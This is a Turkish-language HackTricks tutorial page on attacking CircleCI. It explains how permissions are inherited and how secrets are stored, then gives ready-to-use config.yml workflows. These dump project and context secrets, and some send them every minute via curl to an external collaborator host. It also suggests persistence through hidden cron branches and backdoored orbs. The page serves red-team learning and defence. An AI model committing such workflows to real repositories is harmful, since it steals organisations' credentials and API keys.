# CircleCI Güvenliği

<details>

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## Temel Bilgiler

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/), bazı kodlarla ne yapmak istediğinizi ve ne zaman yapılmasını istediğinizi belirten **şablonları tanımlayabileceğiniz** bir Sürekli Entegrasyon platformudur. Bu şekilde **örneğin depo ana dalınızdan doğrudan testleri otomatikleştirebilir** veya **dağıtımları yapabilirsiniz**.

## İzinler

**CircleCI**, **giriş yapan hesapla ilgili github ve bitbucket izinlerini devralır**.\
Testlerimde, **github depo üzerinde yazma izinleriniz olduğu sürece**, CircleCI'da **proje ayarlarını yönetebileceğinizi** (yeni ssh anahtarları ayarlamak, proje api anahtarları almak, yeni CircleCI yapılandırmalarıyla yeni dallar oluşturmak...) kontrol ettim.

Ancak, bir **depo yöneticisi** olmanız gerekmektedir **depo**yu bir CircleCI projesine **dönüştürmek için**.

## Çevre Değişkenleri ve Sırlar

[**Belgelere**](https://circleci.com/docs/2.0/env-vars/) göre bir iş akışı içinde **çevre değişkenlerine değer yüklemenin** farklı yolları bulunmaktadır.

### Dahili çevre değişkenleri

CircleCI tarafından çalıştırılan her konteyner her zaman [**belgelerde tanımlanan belirli çevre değişkenlerine**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) sahip olacaktır, örneğin `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` veya `CIRCLE_USERNAME`.

### Açık metin

Onları açık metin olarak bir **komut** içinde bildirebilirsiniz:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
**Çalışma ortamı** içinde açık metin olarak tanımlayabilirsiniz:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
**build-job** ortamı içinde açık metin olarak tanımlayabilirsiniz:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
**Bunları bir konteynerin ortamında açık metin olarak bildirebilirsiniz:**
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### Proje Sırları

Bunlar sadece **projenin** (herhangi bir **dal** tarafından) **erişilebilir** olacak **sırlardır**.\
Onları şurada **bildirildiğini** görebilirsiniz _https://app.circleci.com/settings/project/github/\<org\_adı>/\<repo\_adı>/environment-variables_

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
"**Değişkenleri İçe Aktar**" işlevi, bu projeye **diğer projelerden değişkenleri içe aktarmaya** izin verir.
{% endhint %}

### Bağlam Sırları

Bunlar **org genelindeki sırlardır**. **Varsayılan olarak herhangi bir depo**, burada saklanan herhangi bir sıraya **erişebilecektir**:

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
Ancak, farklı bir grup (Tüm üyeler yerine) **seçilebilir ve sırlara sadece belirli kişilerin erişimine izin vermek** için.\
Bu şu anda sırların güvenliğini artırmak için en iyi yollardan biridir, herkesin erişimine izin vermemek ancak bazı kişilere erişim sağlamak.
{% endhint %}

## Saldırılar

### Açık Metin Sırlarını Arama

Eğer **VCS'ye erişiminiz varsa** (github gibi) her bir repo ve her bir dalın `.circleci/config.yml` dosyasını kontrol edin ve orada saklanan potansiyel **açık metin sırlarını arayın**.

### Gizli Çevre Değişkenleri ve Bağlam Numaralandırma

Kodları kontrol ederek her `.circleci/config.yml` dosyasında **kullanılan tüm sırların adlarını** bulabilirsiniz. Ayrıca bu dosyalardan **bağlam adlarını** alabilir veya bunları web konsolunda kontrol edebilirsiniz: _https://app.circleci.com/settings/organization/github/\<org\_adı>/contexts_.

### Proje Sırlarını Dışarı Aktarma

{% hint style="warning" %}
Tüm proje ve bağlam **SIRLARINI dışarı aktarmak** için, github org içindeki **yalnızca 1 depoya yazma** erişiminizin olması yeterlidir (_ve hesabınızın bağlamlara erişimi olmalıdır ancak varsayılan olarak herkes her bağlama erişebilir_).
{% endhint %}

{% hint style="danger" %}
"**Değişkenleri İçe Aktar**" işlevi, bu projeye **diğer projelerden değişkenleri içe aktarmaya** izin verir. Bu nedenle, bir saldırgan **tüm projelerin değişkenlerini tüm depolardan içe aktarabilir** ve ardından **hepsini birlikte dışarı aktarabilir**.
{% endhint %}

Tüm proje sırları her zaman işlerin çevresinde ayarlanır, bu nedenle env'i çağırmak ve base64'te şifrelemek sırları **iş akışı web günlük konsolunda dışarı aktaracaktır**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Eğer **web konsoluna erişiminiz yoksa** ancak **repo'ya erişiminiz varsa** ve CircleCI'nin kullanıldığını biliyorsanız, sadece **her dakika tetiklenen bir iş akışı oluşturabilir** ve **sırları harici bir adrese sızdırabilirsiniz**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### Bağlam Sırlarını Dışarı Aktar

**Bağlam adını belirtmeniz gerekmektedir** (bu aynı zamanda proje sırlarını da dışarı aktaracaktır):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Eğer **web konsoluna erişiminiz yoksa** ancak **repo'ya erişiminiz varsa** ve CircleCI'nin kullanıldığını biliyorsanız, sadece **her dakika tetiklenen bir iş akışını değiştirebilir** ve **sırları harici bir adrese sızdırabilirsiniz**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Yalnızca bir `.circleci/config.yml` dosyası oluşturmak, bir CircleCI derlemesini tetiklemek için yeterli değildir. **Projeyi CircleCI konsolunda etkinleştirmeniz gerekir**.
{% endhint %}

### Buluttan Kaçış

**CircleCI**, derlemelerinizi **kendi makinelerinde veya kendi makinelerinizde** çalıştırma seçeneği sunar.\
Varsayılan olarak, makineleri GCP'de bulunur ve başlangıçta ilgili herhangi bir şey bulamayabilirsiniz. Ancak, bir kurban **kendi makinelerinde (muhtemelen bir bulut ortamında)** görevleri çalıştırıyorsa, ilginç bilgiler içeren bir **bulut meta veri uç noktası bulabilirsiniz**.

Önceki örneklerde her şey bir docker konteyneri içinde başlatıldı, ancak aynı zamanda bir VM makinesi başlatılmasını da **isteyebilirsiniz (farklı bulut izinlerine sahip olabilir)**:
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Ya da uzaktan erişime sahip bir docker konteyneri:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### Kalıcılık

* API uç noktalarına kullanıcı erişimi ile **kullanıcı token'ları oluşturmak** mümkündür.
* _https://app.circleci.com/settings/user/tokens_
* Projeye verilen izinlerle erişmek için **proje token'ları oluşturmak** mümkündür.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Projelere **SSH anahtarları eklemek** mümkündür.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* **Her gün tüm bağlam env değişkenlerini sızdıran** beklenmeyen bir projede **gizli bir dalda cron işi oluşturmak** mümkündür.
* Veya her gün tüm bağlam ve **proje sırlarını sızdıran** bilinen bir işi bir dalda oluşturmak / değiştirmek mümkündür.
* Github sahibiyseniz **doğrulanmamış orb'ları** kabul edebilir ve bir işte **arka kapı** olarak yapılandırabilirsiniz.
* Bazı görevlerde **komut enjeksiyonu açığı** bulabilir ve bir **gizli** değişkenin değerini değiştirerek **komutlar enjekte edebilirsiniz**

<details>

{% hint style="success" %}
AWS Hacking öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek hacking püf noktalarını paylaşın.

</details>
{% endhint %}
